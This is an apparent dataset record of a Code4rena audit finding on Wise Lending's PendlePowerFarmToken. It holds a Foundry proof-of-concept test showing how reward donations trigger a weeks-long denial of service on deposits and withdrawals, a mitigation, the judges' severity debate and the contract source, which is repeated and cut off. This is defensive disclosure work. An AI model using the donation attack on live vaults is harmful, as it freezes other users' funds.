{
  "Title": "[M-12] `PendlePowerFarmToken:: totalLpAssetsToDistribute` may lead to temporary DOS due to price growth check being skipped during deposit",
  "Content": "\n<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L98-L130>\n\n<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L502-L524>\n\n<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L89-L95>\n\n### Impact\n\nRandom actors, malicious or not, can DOS the Pendle `PowerFarm` vault by sending rewards to it through `PendlePowerFarmToken::addCompoundRewards()` or `PendlePowerFarmController::exchangeRewardsForCompoundingWithIncentive()`. This results in all users being unable to access their positions or open new ones for a set amount of time imposed by `PendlePowerFarmToken::_validateSharePriceGrowth()`.\n\n### Proof of Concept\n\nThe `PendlePowerFarmToken` has a mechanism in place that protects the vault from people looping and increasing the share price:\n\n```solidity\nfunction _validateSharePriceGrowth(\n    uint256 _sharePriceNow\n)\n    private\n    view\n{\n    uint256 timeDifference = block.timestamp\n        - INITIAL_TIME_STAMP;\n\n    uint256 maximum = timeDifference\n        * RESTRICTION_FACTOR\n        + PRECISION_FACTOR_E18;\n\n    if (_sharePriceNow > maximum) {\n        revert InvalidSharePriceGrowth();\n    }\n}\n```\n\nThis is a private function invoked from the `syncSupply()` modifier, which is used for the following functions:\n\n- `manualSync()`\n- `addCompoundRewards()`\n- `depositExactAmount()`\n- `withdrawExactShares()`\n- `withdrawExactAmount()`\n\nThe entry point of this exploit is `addCompoundRewards()`:\n\n```solidity\nfunction addCompoundRewards(\n    uint256 _amount\n)\n    external\n    syncSupply\n{\n    if (_amount == 0) {\n        revert ZeroAmount();\n    }\n\n    totalLpAssetsToDistribute += _amount;\n\n    if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {\n        return;\n    }\n\n    _safeTransferFrom(\n        UNDERLYING_PENDLE_MARKET,\n        msg.sender,\n        PENDLE_POWER_FARM_CONTROLLER,\n        _amount\n    );\n}\n```\n\nWe can see that it allows users to donate their tokens to the vault to increase the `totalLpAssetsToDistribute`. This is then distributed among holders with subsequent calls to the aforementioned functions.\n\nThis is the code for the `syncSupply()` modifier:\n\n```solidity\nmodifier syncSupply()\n{\n    _triggerIndexUpdate();\n    _overWriteCheck();\n    _syncSupply();\n    _updateRewards();\n    _setLastInteraction();\n    _increaseCardinalityNext();\n    uint256 sharePriceBefore = _getSharePrice();\n    _;\n    _validateSharePriceGrowth(\n        _validateSharePrice(\n            sharePriceBefore\n        )\n    );\n}\n```\n\nThe problem here is that even though `addCompoundRewards()` calls it, the rewards added do not affect the share price immediately. It's still the previously deposited amount. So, the condition `_sharePriceNow > maximum` holds true at the time someone calls `addCompoundRewards()` but causes a revert with subsequent calls to functions dependent on the modifier until enough time passes for the condition to hold true again.\n\nCoded POC (`PendlePowerFarmControllerBase.t.sol`):\n\n```solidity\n function testDOSVault() public normalSetup(true) {\n    (IERC20 tokenReceived, uint256 balanceReceived) =\n        _getTokensToPlayWith(CRVUSD_PENDLE_28MAR_2024, crvUsdMar2024LP_WHALE);\n\n    (uint256 depositAmount, IPendlePowerFarmToken derivativeToken) =\n        _prepareDeposit(CRVUSD_PENDLE_28MAR_2024, tokenReceived, balanceReceived);\n\n    address alice = makeAddr(\"alice\");\n    address bob = makeAddr(\"bob\");\n    address charlie = makeAddr(\"charlie\");\n\n    IERC20 pendleLpToken = IERC20(CRVUSD_PENDLE_28MAR_2024);\n\n    pendleLpToken.transfer(alice, 1.3e18);\n    pendleLpToken.transfer(bob, 2e18);\n    pendleLpToken.transfer(charlie, 1e18);\n\n    vm.startPrank(alice);\n    pendleLpToken.approve(address(derivativeToken), 1.3e18);\n    derivativeToken.depositExactAmount(1.3e18);\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    pendleLpToken.approve(address(derivativeToken), 2e18);\n    derivativeToken.addCompoundRewards(2e18);\n    vm.stopPrank();\n\n    // DOS happens once timestamp changes\n    vm.warp(block.timestamp + 1 seconds);\n\n    // Charlie cannot deposit\n    vm.startPrank(charlie);\n    pendleLpToken.approve(address(derivativeToken), 1e18);\n    vm.expectRevert(); // InvalidSharePriceGrowth\n    derivativeToken.depositExactAmount(1 ether);\n    vm.stopPrank();\n\n    // Alice cannot withdraw\n    vm.startPrank(alice);\n    vm.expectRevert(); // InvalidSharePriceGrowth\n    derivativeToken.withdrawExactShares(1e18);\n    vm.stopPrank();\n\n    // After 8 weeks, transactions still fail since _sharePriceNow is still greater than maximum (look at PendlePowerFarmToken::__validateSharePriceGrowth())\n    vm.warp(block.timestamp + 8 weeks);\n\n    // Alice still cannot withdraw\n    vm.startPrank(alice);\n    vm.expectRevert(); // InvalidSharePriceGrowth\n    derivativeToken.withdrawExactShares(1e18);\n    vm.stopPrank();\n\n    // From this point onwards, maximum > _sharePriceNow\n    vm.warp(block.timestamp + 9 weeks);\n\n    // Charlie can now deposit\n    vm.startPrank(charlie);\n    pendleLpToken.approve(address(derivativeToken), 1e18);\n    derivativeToken.depositExactAmount(1 ether);\n    vm.stopPrank();\n\n    // Alice can now deposit\n    vm.startPrank(alice);\n    derivativeToken.withdrawExactShares(1e18);\n    vm.stopPrank();\n}\n```\n\n### Recommended Mitigation Steps\n\nI recommend turning the deposited rewards into shares at the time of calling `addCompoundRewards()`, so we can get `_validateSharePriceGrowth()` to validate it immediately and revert on the spot if needed. This will prevent the DOS and share price growth manipulation.\n\n### Assessed type\n\nDoS\n\n**[Trust (judge) increased severity to High and commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2020999197):**\n > High is reasonable for temporary freeze of funds.\n\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2022982231):**\n > > High is reasonable for temporary freeze of funds.\n> \n> That is literally definition of a Medium - temporary freeze of the funds. High is permanent freeze of funds. So dismiss the high.\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2022988055):**\n > https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\n> \n> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> \n> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2023193084):**\n > This is on the upper end of temporary FoF attacks, it also lasts for an extended duration. I would rule High on much weaker versions of this finding, not even close to downgrade-worthy.\n\n**[Alex the Entreprenerd (Appellate Court judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2056798828):**\n > ### Summary of the issue\n>\n> Due to a security check on LP value growth, a donation can cause the temporary inability to withdraw from a Farm Contract\n> \n> ### Discussion\n> \n> **Alex the Entreprenerd (Appellate Court lead judge) commented:**\n> Facts:\n> The Dos has a cost, that grows with supply.\n> The Dos can be performed permissionlessly, at any time.\n> \n> I'm unclear as to whether this is tied to liquidation risk, which should raise the severity.\n> \n> **hickuphh3 (judge 2) commented:**\n> From what I see, it shouldn't affect liquidations or protocol health, only causing forced hodl with guaranteed returns. Hence, leaning towards Medium more than High.\n> \n> **Alex the Entreprenerd (Appellate Court lead judge) commented:**\n> Facts:\n> Information contained in the report mentions exclusively an inability to withdraw (funds stuck).\n> Other facts above still apply.\n> \n> I agree that Medium Severity seems the most appropriate because:\n> - More supply = higher cost.\n> - Dos is temporary.\n> - Unclear/Missing usage to DOS a key feature.\n> \n> **LSDan (judge 3) commented:**\n> I'm also of the opinion that Medium is more appropriate here. \n> \n>> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n>\n> Assets are not at direct risk. The minute the DOS stops the assets are once again available. Further, the cost to DOS the platform is not trivial. As you both pointed out, the more assets being frozen, the higher the cost. The attacker is donating to the users they are DOSing, leaving the user inconvenienced, but richer at the attacker's expense.\n> \n> ### Deliberation\n>\n> The severity is downgraded to Medium unanimously.\n> \n> ### Additional Context by the Lead Judge\n>\n> Had the Report shown a way to weaponize this to halt liquidations, we would have had a easier time pushing for a higher severity.\n> \n> However, given the Report only limiting itself to a temporary inability to withdraw, with no loss of principal, the decision was straightforward.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2056897212):**\n> 1. I remain convinced that a permissionless, non-theoretical temporary FoF for non-negligible length (certainly days/weeks as shown) meets High severity threshold.\n> 2. Impact breaks a core invariant which states users can always pull out their funds. Users making monetary decisions under that assumption can certainly face loss of principal (e.g. cannot pull out to repay a due-loan, etc).\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2082919302):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n*Note, this finding was downgraded to Medium by C4 staff in reference to the Appellate Court decision.*\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2024-02-wise-lending",
  "Code": [
    {
      "filename": "contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol",
      "content": "// SPDX-License-Identifier: -- WISE --\n\npragma solidity =0.8.24;\n\nimport \"./SimpleERC20Clone.sol\";\n\nimport \"../../InterfaceHub/IPendle.sol\";\nimport \"../../InterfaceHub/IPendleController.sol\";\n\nimport \"../../TransferHub/TransferHelper.sol\";\n\nerror MarketExpired();\nerror NotController();\nerror ZeroFee();\nerror TooMuchFee();\nerror NotEnoughLpAssetsTransferred();\nerror InsufficientShares();\nerror ZeroAmount();\nerror FeeTooHigh();\nerror NotEnoughShares();\nerror InvalidSharePriceGrowth();\nerror InvalidSharePrice();\nerror AlreadyInitialized();\n\ncontract PendlePowerFarmToken is SimpleERC20, TransferHelper {\n\n    // Pendle - LP token address\n    address public UNDERLYING_PENDLE_MARKET;\n    address public PENDLE_POWER_FARM_CONTROLLER;\n\n    // Total balance of LPs backing at current compound distribution\n    uint256 public underlyingLpAssetsCurrent;\n\n    // Lp assets from compound left to distribute\n    uint256 public totalLpAssetsToDistribute;\n\n    // Interface Object for underlying Market\n    IPendleMarket public PENDLE_MARKET;\n\n    // InterfaceObject for pendle Sy\n    IPendleSy public PENDLE_SY;\n\n    // Interface for Pendle Controller\n    IPendleController public PENDLE_CONTROLLER;\n\n    // Max cardinality of Pendle Market\n    uint16 public MAX_CARDINALITY;\n\n    uint256 public mintFee;\n    uint256 public lastInteraction;\n\n    uint256 private constant ONE_WEEK = 7 days;\n    uint256 internal constant ONE_YEAR = 365 days;\n    uint256 private constant MAX_MINT_FEE = 10000;\n\n    uint256 private constant PRECISION_FACTOR_E6 = 1E6;\n    uint256 private constant PRECISION_FACTOR_E18 = 1E18;\n    uint256 internal constant PRECISION_FACTOR_E36 = PRECISION_FACTOR_E18 * PRECISION_FACTOR_E18;\n    uint256 internal constant PRECISION_FACTOR_YEAR = PRECISION_FACTOR_E18 * ONE_YEAR;\n\n    uint256 private INITIAL_TIME_STAMP;\n\n    uint256 internal constant RESTRICTION_FACTOR = 10\n        * PRECISION_FACTOR_E36\n        / PRECISION_FACTOR_YEAR;\n\n    modifier onlyController() {\n        _onlyController();\n        _;\n    }\n\n    function _onlyController()\n        private\n        view\n    {\n        if (msg.sender != PENDLE_POWER_FARM_CONTROLLER) {\n            revert NotController();\n        }\n    }\n\n    modifier syncSupply()\n    {\n        _triggerIndexUpdate();\n        _overWriteCheck();\n        _syncSupply();\n        _updateRewards();\n        _setLastInteraction();\n        _increaseCardinalityNext();\n        uint256 sharePriceBefore = _getSharePrice();\n        _;\n        _validateSharePriceGrowth(\n            _validateSharePrice(\n                sharePriceBefore\n            )\n        );\n    }\n\n    function _validateSharePrice(\n        uint256 _sharePriceBefore\n    )\n        private\n        view\n        returns (uint256)\n    {\n        uint256 sharePricenNow = _getSharePrice();\n\n        if (sharePricenNow < _sharePriceBefore) {\n            revert InvalidSharePrice();\n        }\n\n        return sharePricenNow;\n    }\n\n    function _validateSharePriceGrowth(\n        uint256 _sharePriceNow\n    )\n        private\n        view\n    {\n        uint256 timeDifference = block.timestamp\n            - INITIAL_TIME_STAMP;\n\n        uint256 maximum = timeDifference\n            * RESTRICTION_FACTOR\n            + PRECISION_FACTOR_E18;\n\n        if (_sharePriceNow > maximum) {\n            revert InvalidSharePriceGrowth();\n        }\n    }\n\n    function _overWriteCheck()\n        internal\n    {\n        _wrapOverWrites(\n            _updateRewardTokens()\n        );\n    }\n\n    function _triggerIndexUpdate()\n        internal\n    {\n        _withdrawLp(\n            UNDERLYING_PENDLE_MARKET,\n            0\n        );\n    }\n\n    function _wrapOverWrites(\n        bool _overWritten\n    )\n        internal\n    {\n        if (_overWritten == true) {\n            _overWriteIndexAll();\n            _overWriteAmounts();\n        }\n    }\n\n    function _updateRewardTokens()\n        private\n        returns (bool)\n    {\n        return PENDLE_CONTROLLER.updateRewardTokens(\n            UNDERLYING_PENDLE_MARKET\n        );\n    }\n\n    function _overWriteIndexAll()\n        private\n    {\n        PENDLE_CONTROLLER.overWriteIndexAll(\n            UNDERLYING_PENDLE_MARKET\n        );\n    }\n\n    function _overWriteIndex(\n        uint256 _index\n    )\n        private\n    {\n        PENDLE_CONTROLLER.overWriteIndex(\n            UNDERLYING_PENDLE_MARKET,\n            _index\n        );\n    }\n\n    function _overWriteAmounts()\n        private\n    {\n        PENDLE_CONTROLLER.overWriteAmounts(\n            UNDERLYING_PENDLE_MARKET\n        );\n    }\n\n    function _updateRewards()\n        private\n    {\n        uint256[] memory rewardsOutsideArray = _calculateRewardsClaimedOutside();\n\n        uint256 i;\n        uint256 l = rewardsOutsideArray.length;\n\n        while (i < l) {\n            if (rewardsOutsideArray[i] > 0) {\n                PENDLE_CONTROLLER.increaseReservedForCompound(\n                    UNDERLYING_PENDLE_MARKET,\n                    rewardsOutsideArray\n                );\n                break;\n            }\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    function _calculateRewardsClaimedOutside()\n        internal\n        returns (uint256[] memory)\n    {\n        address[] memory rewardTokens = PENDLE_CONTROLLER.pendleChildCompoundInfoRewardTokens(\n            UNDERLYING_PENDLE_MARKET\n        );\n\n        uint128[] memory lastIndex = PENDLE_CONTROLLER.pendleChildCompoundInfoLastIndex(\n            UNDERLYING_PENDLE_MARKET\n        );\n\n        uint256 l = rewardTokens.length;\n        uint256[] memory rewardsOutsideArray = new uint256[](l);\n\n        uint256 i;\n        uint128 index;\n\n        while (i < l) {\n            UserReward memory userReward = _getUserReward(\n                rewardTokens[i],\n                PENDLE_POWER_FARM_CONTROLLER\n            );\n\n            if (userReward.accrued > 0) {\n                PENDLE_MARKET.redeemRewards(\n                    PENDLE_POWER_FARM_CONTROLLER\n                );\n\n                userReward = _getUserReward(\n                    rewardTokens[i],\n                    PENDLE_POWER_FARM_CONTROLLER\n                );\n            }\n\n            index = userReward.index;\n\n            if (lastIndex[i] == 0 && index > 0) {\n                rewardsOutsideArray[i] = 0;\n                _overWriteIndex(\n                    i\n                );\n                unchecked {\n                    ++i;\n                }\n                continue;\n            }\n\n            if (index == lastIndex[i]) {\n                rewardsOutsideArray[i] = 0;\n                unchecked {\n                    ++i;\n                }\n                continue;\n            }\n\n            uint256 indexDiff = index\n                - lastIndex[i];\n\n            uint256 activeBalance = _getActiveBalance();\n            uint256 totalLpAssetsCurrent = totalLpAssets();\n            uint256 lpBalanceController = _getBalanceLpBalanceController();\n\n            bool scaleNecessary = totalLpAssetsCurrent < lpBalanceController;\n\n            rewardsOutsideArray[i] = scaleNecessary\n                ? indexDiff\n                    * activeBalance\n                    * totalLpAssetsCurrent\n                    / lpBalanceController\n                    / PRECISION_FACTOR_E18\n                : indexDiff\n                    * activeBalance\n                    / PRECISION_FACTOR_E18;\n\n            _overWriteIndex(\n                i\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        return rewardsOutsideArray;\n    }\n\n    function _getBalanceLpBalanceController()\n        private\n        view\n        returns (uint256)\n    {\n        return PENDLE_MARKET.balanceOf(\n            PENDLE_POWER_FARM_CONTROLLER\n        );\n    }\n\n    function _getActiveBalance()\n        private\n        view\n        returns (uint256)\n    {\n        return PENDLE_MARKET.activeBalance(\n            PENDLE_POWER_FARM_CONTROLLER\n        );\n    }\n\n    function _getSharePrice()\n        private\n        view\n        returns (uint256)\n    {\n        return previewUnderlyingLpAssets() * PRECISION_FACTOR_E18\n            / totalSupply();\n    }\n\n    function _syncSupply()\n        private\n    {\n        uint256 additonalAssets = previewDistribution();\n\n        if (additonalAssets == 0) {\n            return;\n        }\n\n        underlyingLpAssetsCurrent += additonalAssets;\n        totalLpAssetsToDistribute -= additonalAssets;\n    }\n\n    function _increaseCardinalityNext()\n        internal\n    {\n        MarketStorage memory storageMarket = PENDLE_MARKET._storage();\n\n        if (storageMarket.observationCardinalityNext < MAX_CARDINALITY) {\n            PENDLE_MARKET.increaseObservationsCardinalityNext(\n                storageMarket.observationCardinalityNext + 1\n            );\n        }\n    }\n\n    function _withdrawLp(\n        address _to,\n        uint256 _amount\n    )\n        internal\n    {\n        PENDLE_CONTROLLER.withdrawLp(\n            UNDERLYING_PENDLE_MARKET,\n            _to,\n            _amount\n        );\n    }\n\n    function _getUserReward(\n        address _rewardToken,\n        address _user\n    )\n        internal\n        view\n        returns (UserReward memory)\n    {\n        return PENDLE_MARKET.userReward(\n            _rewardToken,\n            _user\n        );\n    }\n\n    function previewDistribution()\n        public\n        view\n        returns (uint256)\n    {\n        if (totalLpAssetsToDistribute == 0) {\n            return 0;\n        }\n\n        if (block.timestamp == lastInteraction) {\n            return 0;\n        }\n\n        if (totalLpAssetsToDistribute < ONE_WEEK) {\n            return totalLpAssetsToDistribute;\n        }\n\n        uint256 currentRate = totalLpAssetsToDistribute\n            / ONE_WEEK;\n\n        uint256 additonalAssets = currentRate\n            * (block.timestamp - lastInteraction);\n\n        if (additonalAssets > totalLpAssetsToDistribute) {\n            return totalLpAssetsToDistribute;\n        }\n\n        return additonalAssets;\n    }\n\n    function _setLastInteraction()\n        private\n    {\n        lastInteraction = block.timestamp;\n    }\n\n    function _applyMintFee(\n        uint256 _amount\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        return _amount\n            * (PRECISION_FACTOR_E6 - mintFee)\n            / PRECISION_FACTOR_E6;\n    }\n\n    function totalLpAssets()\n        public\n        view\n        returns (uint256)\n    {\n        return underlyingLpAssetsCurrent\n            + totalLpAssetsToDistribute;\n    }\n\n    function previewUnderlyingLpAssets()\n        public\n        view\n        returns (uint256)\n    {\n        return previewDistribution()\n            + underlyingLpAssetsCurrent;\n    }\n\n    function previewMintShares(\n        uint256 _underlyingAssetAmount,\n        uint256 _underlyingLpAssetsCurrent\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return _underlyingAssetAmount\n            * totalSupply()\n            / _underlyingLpAssetsCurrent;\n    }\n\n    function previewAmountWithdrawShares(\n        uint256 _shares,\n        uint256 _underlyingLpAssetsCurrent\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return _shares\n            * _underlyingLpAssetsCurrent\n            / totalSupply();\n    }\n\n    function previewBurnShares(\n        uint256 _underlyingAssetAmount,\n        uint256 _underlyingLpAssetsCurrent\n    )\n        public\n        view\n        returns (uint256)\n    {\n        uint256 product = _underlyingAssetAmount\n            * totalSupply();\n\n        return product % _underlyingLpAssetsCurrent == 0\n            ? product / _underlyingLpAssetsCurrent\n            : product / _underlyingLpAssetsCurrent + 1;\n    }\n\n    function manualSync()\n        external\n        syncSupply\n        returns (bool)\n    {\n        return true;\n    }\n\n    function addCompoundRewards(\n        uint256 _amount\n    )\n        external\n        syncSupply\n    {\n        if (_amount == 0) {\n            revert ZeroAmount();\n        }\n\n        totalLpAssetsToDistribute += _amount;\n\n        if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {\n            return;\n        }\n\n        _safeTransferFrom(\n            UNDERLYING_PENDLE_MARKET,\n            msg.sender,\n            PENDLE_POWER_FARM_CONTROLLER,\n            _amount\n        );\n    }\n\n    /**\n     * @dev External wrapper for mint function.\n     */\n    function depositExactAmount(\n        uint256 _underlyingLpAssetAmount\n    )\n        external\n        syncSupply\n        returns (\n            uint256,\n            uint256\n        )\n    {\n        if (_underlyingLpAssetAmount == 0) {\n            revert ZeroAmount();\n        }\n\n        uint256 shares = previewMintShares(\n            _underlyingLpAssetAmount,\n            underlyingLpAssetsCurrent\n        );\n\n        if (shares == 0) {\n            revert NotEnoughLpAssetsTransferred();\n        }\n\n        uint256 reducedShares = _applyMintFee(\n            shares\n        );\n\n        uint256 feeShares = shares\n            - reducedShares;\n\n        if (feeShares == 0) {\n            revert ZeroFee();\n        }\n\n        if (reducedShares == feeShares) {\n            revert TooMuchFee();\n        }\n\n        _mint(\n            msg.sender,\n            reducedShares\n        );\n\n        _mint(\n            PENDLE_POWER_FARM_CONTROLLER,\n            feeShares\n        );\n\n        underlyingLpAssetsCurrent += _underlyingLpAssetAmount;\n\n        _safeTransferFrom(\n            UNDERLYING_PENDLE_MARKET,\n            msg.sender,\n            PENDLE_POWER_FARM_CONTROLLER,\n            _underlyingLpAssetAmount\n        );\n\n        return (\n            reducedShares,\n            feeShares\n        );\n    }\n\n    function changeMintFee(\n        uint256 _newFee\n    )\n        external\n        onlyController\n    {\n        if (_newFee > MAX_MINT_FEE) {\n            revert FeeTooHigh();\n        }\n\n        mintFee = _newFee;\n    }\n\n    /**\n     * @dev External wrapper for burn function.\n     */\n    function withdrawExactShares(\n        uint256 _shares\n    )\n        external\n        syncSupply\n        returns (uint256)\n    {\n        if (_shares == 0) {\n            revert ZeroAmount();\n        }\n\n        if (_shares > balanceOf(msg.sender)) {\n            revert InsufficientShares();\n        }\n\n        uint256 tokenAmount = previewAmountWithdrawShares(\n            _shares,\n            underlyingLpAssetsCurrent\n        );\n\n        underlyingLpAssetsCurrent -= tokenAmount;\n\n        _burn(\n            msg.sender,\n            _shares\n        );\n\n        if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {\n            return tokenAmount;\n        }\n\n        _withdrawLp(\n            msg.sender,\n            tokenAmount\n        );\n\n        return tokenAmount;\n    }\n\n    function withdrawExactAmount(\n        uint256 _underlyingLpAssetAmount\n    )\n        external\n        syncSupply\n        returns (uint256)\n    {\n        if (_underlyingLpAssetAmount == 0) {\n            revert ZeroAmount();\n        }\n\n        uint256 shares = previewBurnShares(\n            _underlyingLpAssetAmount,\n            underlyingLpAssetsCurrent\n        );\n\n        if (shares > balanceOf(msg.sender)) {\n            revert NotEnoughShares();\n        }\n\n        _burn(\n            msg.sender,\n            shares\n        );\n\n        underlyingLpAssetsCurrent -= _underlyingLpAssetAmount;\n\n        _withdrawLp(\n            msg.sender,\n            _underlyingLpAssetAmount\n        );\n\n        return shares;\n    }\n\n    function initialize(\n        address _underlyingPendleMarket,\n        address _pendleController,\n        string memory _tokenName,\n        string memory _symbolName,\n        uint16 _maxCardinality\n    )\n        external\n    {\n        if (address(PENDLE_MARKET) != address(0)) {\n            revert AlreadyInitialized();\n        }\n\n        PENDLE_MARKET = IPendleMarket(\n            _underlyingPendleMarket\n        );\n\n        if (PENDLE_MARKET.isExpired() == true) {\n            revert MarketExpired();\n        }\n\n        PENDLE_CONTROLLER = IPendleController(\n            _pendleController\n        );\n\n        MAX_CARDINALITY = _maxCardinality;\n\n        _name = _tokenName;\n        _symbol = _symbolName;\n\n        PENDLE_POWER_FARM_CONTROLLER = _pendleController;\n        UNDERLYING_PENDLE_MARKET = _underlyingPendleMarket;\n\n        (\n            address pendleSyAddress,\n            ,\n        ) = PENDLE_MARKET.readTokens();\n\n        PENDLE_SY = IPendleSy(\n            pendleSyAddress\n        );\n\n        _decimals = PENDLE_SY.decimals();\n\n        lastInteraction = block.timestamp;\n\n        _totalSupply = 1;\n        underlyingLpAssetsCurrent = 1;\n        mintFee = 3000;\n        INITIAL_TIME_STAMP = block.timestamp;\n    }\n}"
    },
    {
      "filename": "contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol",
      "content": "// SPDX-License-Identifier: -- WISE --\n\npragma solidity =0.8.24;\n\nimport \"./SimpleERC20Clone.sol\";\n\nimport \"../../InterfaceHub/IPendle.sol\";\nimport \"../../InterfaceHub/IPendleController.sol\";\n\nimport \"../../TransferHub/TransferHelper.sol\";\n\nerror MarketExpired();\nerror NotController();\nerror ZeroFee();\nerror TooMuchFee();\nerror NotEnoughLpAssetsTransferred();\nerror InsufficientShares();\nerror ZeroAmount();\nerror FeeTooHigh();\nerror NotEnoughShares();\nerror InvalidSharePriceGrowth();\nerror InvalidSharePrice();\nerror AlreadyInitialized();\n\ncontract PendlePowerFarmToken is SimpleERC20, TransferHelper {\n\n    // Pendle - LP token address\n    address public UNDERLYING_PENDLE_MARKET;\n    address public PENDLE_POWER_FARM_CONTROLLER;\n\n    // Total balance of LPs backing at current compound distribution\n    uint256 public underlyingLpAssetsCurrent;\n\n    // Lp assets from compound left to distribute\n    uint256 public totalLpAssetsToDistribute;\n\n    // Interface Object for underlying Market\n    IPendleMarket public PENDLE_MARKET;\n\n    // InterfaceObject for pendle Sy\n    IPendleSy public PENDLE_SY;\n\n    // Interface for Pendle Controller\n    IPendleController public PENDLE_CONTROLLER;\n\n    // Max cardinality of Pendle Market\n    uint16 public MAX_CARDINALITY;\n\n    uint256 public mintFee;\n    uint256 public lastInteraction;\n\n    uint256 private constant ONE_WEEK = 7 days;\n    uint256 internal constant ONE_YEAR = 365 days;\n    uint256 private constant MAX_MINT_FEE = 10000;\n\n    uint256 private constant PRECISION_FACTOR_E6 = 1E6;\n    uint256 private constant PRECISION_FACTOR_E18 = 1E18;\n    uint256 internal constant PRECISION_FACTOR_E36 = PRECISION_FACTOR_E18 * PRECISION_FACTOR_E18;\n    uint256 internal constant PRECISION_FACTOR_YEAR = PRECISION_FACTOR_E18 * ONE_YEAR;\n\n    uint256 private INITIAL_TIME_STAMP;\n\n    uint256 internal constant RESTRICTION_FACTOR = 10\n        * PRECISION_FACTOR_E36\n        / PRECISION_FACTOR_YEAR;\n\n    modifier onlyController() {\n        _onlyController();\n        _;\n    }\n\n    function _onlyController()\n        private\n        view\n    {\n        if (msg.sender != PENDLE_POWER_FARM_CONTROLLER) {\n            revert NotController();\n        }\n    }\n\n    modifier syncSupply()\n    {\n        _triggerIndexUpdate();\n        _overWriteCheck();\n        _syncSupply();\n        _updateRewards();\n        _setLastInteraction();\n        _increaseCardinalityNext();\n        uint256 sharePriceBefore = _getSharePrice();\n        _;\n        _validateSharePriceGrowth(\n            _validateSharePrice(\n                sharePriceBefore\n            )\n        );\n    }\n\n    function _validateSharePrice(\n        uint256 _sharePriceBefore\n    )\n        private\n        view\n        returns (uint256)\n    {\n        uint256 sharePricenNow = _getSharePrice();\n\n        if (sharePricenNow < _sharePriceBefore) {\n            revert InvalidSharePrice();\n        }\n\n        return sharePricenNow;\n    }\n\n    function _validateSharePriceGrowth(\n        uint256 _sharePriceNow\n    )\n        private\n        view\n    {\n        uint256 timeDifference = block.timestamp\n            - INITIAL_TIME_STAMP;\n\n        uint256 maximum = timeDifference\n            * RESTRICTION_FACTOR\n            + PRECISION_FACTOR_E18;\n\n        if (_sharePriceNow > maximum) {\n            revert InvalidSharePriceGrowth();\n        }\n    }\n\n    function _overWriteCheck()\n        internal\n    {\n        _wrapOverWrites(\n            _updateRewardTokens()\n        );\n    }\n\n    function _triggerIndexUpdate()\n        internal\n    {\n        _withdrawLp(\n            UNDERLYING_PENDLE_MARKET,\n            0\n        );\n    }\n\n    function _wrapOverWrites(\n        bool _overWritten\n    )\n        internal\n    {\n        if (_overWritten == true) {\n            _overWriteIndexAll();\n            _overWriteAmounts();\n        }\n    }\n\n    function _updateRewardTokens()\n        private\n        returns (bool)\n    {\n        return PENDLE_CONTROLLER.updateRewardTokens(\n            UNDERLYING_PENDLE_MARKET\n        );\n    }\n\n    function _overWriteIndexAll()\n        private\n    {\n        PENDLE_CONTROLLER.overWriteIndexAll(\n            UNDERLYING_PENDLE_MARKET\n        );\n    }\n\n    function _overWriteIndex(\n        uint256 _index\n    )\n        private\n    {\n        PENDLE_CONTROLLER.overWriteIndex(\n            UNDERLYING_PENDLE_MARKET,\n            _index\n        );\n    }\n\n    function _overWriteAmounts()\n        private\n    {\n        PENDLE_CONTROLLER.overWriteAmounts(\n            UNDERLYING_PENDLE_MARKET\n        );\n    }\n\n    function _updateRewards()\n        private\n    {\n        uint256[] memory rewardsOutsideArray = _calculateRewardsClaimedOutside();\n\n        uint256 i;\n        uint256 l = rewardsOutsideArray.length;\n\n        while (i < l) {\n            if (rewardsOutsideArray[i] > 0) {\n                PENDLE_CONTROLLER.increaseReservedForCompound(\n                    UNDERLYING_PENDLE_MARKET,\n                    rewardsOutsideArray\n                );\n                break;\n            }\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    function _calculateRewardsClaimedOutside()\n        internal\n        returns (uint256[] memory)\n    {\n        address[] memory rewardTokens = PENDLE_CONTROLLER.pendleChildCompoundInfoRewardTokens(\n            UNDERLYING_PENDLE_MARKET\n        );\n\n        uint128[] memory lastIndex = PENDLE_CONTROLLER.pendleChildCompoundInfoLastIndex(\n            UNDERLYING_PENDLE_MARKET\n        );\n\n        uint256 l = rewardTokens.length;\n        uint256[] memory rewardsOutsideArray = new uint256[](l);\n\n        uint256 i;\n        uint128 index;\n\n        while (i < l) {\n            UserReward memory userReward = _getUserReward(\n                